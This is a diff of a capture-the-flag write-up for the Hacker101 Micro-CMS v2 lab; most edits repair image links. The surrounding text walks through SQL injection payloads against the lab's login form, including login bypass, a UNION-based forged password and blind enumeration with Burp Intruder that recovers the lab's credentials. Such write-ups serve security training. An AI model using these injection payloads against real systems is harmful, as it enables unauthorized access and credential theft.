@@ -2,12 +2,12 @@
 
 The Changelog shows the security fixes in v2
 <p align="center">
-  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/Hacker101/Micro-CMSv2/src/1.png" alt="1" />
+  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/blob/dev/Hacker101/Micro-CMSv2/src/1.png" alt="1" />
 </p>
 
 As said, editing pages require an admin login
 <p align="center">
-  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/Hacker101/Micro-CMSv2/src/2.png" alt="1" />
+  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/blob/dev/Hacker101/Micro-CMSv2/src/2.png" alt="1" />
 </p>
 
 ### SQLi vulnerability
@@ -38,7 +38,7 @@ username = ' or 1=1#
 password = t
 ```
 <p align="center">
-  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/Hacker101/Micro-CMSv2/src/3.png" alt="1" />
+  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/blob/dev/Hacker101/Micro-CMSv2/src/3.png" alt="1" />
 </p>
 
 Otherwise in an **Unknown user**
@@ -47,7 +47,7 @@ username = ' or 1=2#
 password
 ```
 <p align="center">
-  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/Hacker101/Micro-CMSv2/src/4.png" alt="1" />
+  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/blob/dev/Hacker101/Micro-CMSv2/src/4.png" alt="1" />
 </p>
 
 The code evaluates True or False since the [execute](https://dev.mysql.com/doc/connector-python/en/connector-python-api-mysqlcursor-execute.html) method returns a Boolean value
@@ -58,7 +58,7 @@ username = ' union select 'ab' as password#
 password = ab
 ```
 <p align="center">
-  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/Hacker101/Micro-CMSv2/src/5.png" alt="1" />
+  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/blob/dev/Hacker101/Micro-CMSv2/src/5.png" alt="1" />
 </p>
 
 but the comment suggests to find a real username/password combination to get the flag
@@ -92,7 +92,7 @@ username = ' or length(password) "%y"#
 Where
 - **y** will be an int payload in Burp's Intruder
 
-We find **9** as length filtering the results for "Invalid password"
+We find **9** as length filtering the results for **Invalid password**
 
 Then the final query will be
 ```
@@ -105,7 +105,7 @@ Where
 
 We find password **stephanie**
 <p align="center">
-  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/Hacker101/Micro-CMSv2/src/6.png" alt="1" />
+  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/blob/dev/Hacker101/Micro-CMSv2/src/6.png" alt="1" />
 </p>
 
 
@@ -116,7 +116,7 @@ username='or password='stephanie' and username like '§_§§_§§_§§_§§_§§
 ```
 We find username **pearly**
 <p align="center">
-  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/Hacker101/Micro-CMSv2/src/7.png" alt="1" />
+  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/blob/dev/Hacker101/Micro-CMSv2/src/7.png" alt="1" />
 </p>
 
 By logging with **pearly:stephanie** we get the flag!
